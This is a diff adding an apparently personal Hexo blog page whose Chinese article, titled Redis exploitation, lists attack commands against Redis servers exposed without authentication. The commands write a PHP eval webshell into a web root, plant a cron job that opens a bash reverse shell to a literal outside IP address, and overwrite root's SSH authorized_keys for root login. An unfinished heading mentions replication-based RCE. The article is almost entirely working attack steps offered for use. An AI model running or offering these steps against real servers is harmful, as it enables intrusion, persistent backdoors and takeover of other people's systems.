@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Redis漏洞利用[toc] 1.未授权访问(写webshell)1234config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;save  2.未授权访问(反弹shell)1234config set di">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/10/23/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="Redis漏洞利用[toc] 1.未授权访问(写webshell)1234config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;save  2.未授权访问(反弹shell)1234config set di">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-23T11:27:01.158Z">
+<meta property="article:modified_time" content="2025-10-23T11:50:37.690Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-Redis未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/10/23/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2025-10-23T11:27:01.158Z" itemprop="datePublished">2025-10-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h3><p>[toc]</p>
+<h5 id="1-未授权访问-写webshell"><a href="#1-未授权访问-写webshell" class="headerlink" title="1.未授权访问(写webshell)"></a>1.未授权访问(写webshell)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-未授权访问-反弹shell"><a href="#2-未授权访问-反弹shell" class="headerlink" title="2.未授权访问(反弹shell)"></a>2.未授权访问(反弹shell)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xss &quot;\n\n*/1****bash -i &gt;&amp; /dev/tcp/139.155.49.43/1234 0&gt; &amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-未授权访问-写公钥"><a href="#3-未授权访问-写公钥" class="headerlink" title="3.未授权访问(写公钥)"></a>3.未授权访问(写公钥)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">默认情况下 生成后在用户的家目录下的.ssh目录下</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_ras.pub;echo -e &quot;\n\n&quot; &gt; /tmp/foo.txt)</span><br><span class="line">cat /tmp/foo.txt |redis-cli -h 192.168.1.100 -p 6379 -x set crackit</span><br><span class="line">redis-cli -h 192.168.1.100 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">ssh root@139.9.198.30 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>#####4.未授权访问(主从复制RCE)</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/11/03/suid%E6%8F%90%E6%9D%83/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/10/10/python/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
